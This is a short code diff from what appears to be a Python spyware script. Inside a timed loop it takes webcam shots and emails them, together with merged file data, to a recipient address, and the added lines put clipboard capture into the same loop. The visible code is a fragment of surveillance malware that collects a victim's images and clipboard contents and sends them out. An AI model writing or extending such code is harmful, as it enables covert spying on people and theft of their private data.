@@ -166,3 +166,8 @@ while number_of_iterations < number_of_iterations_end:
 
         webCamera()
         send_email(webCamShot_info, file_merge + webCamShot_info, toaddr)
+
+        copy_clipboard()
+        number_of_iterations += 1
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
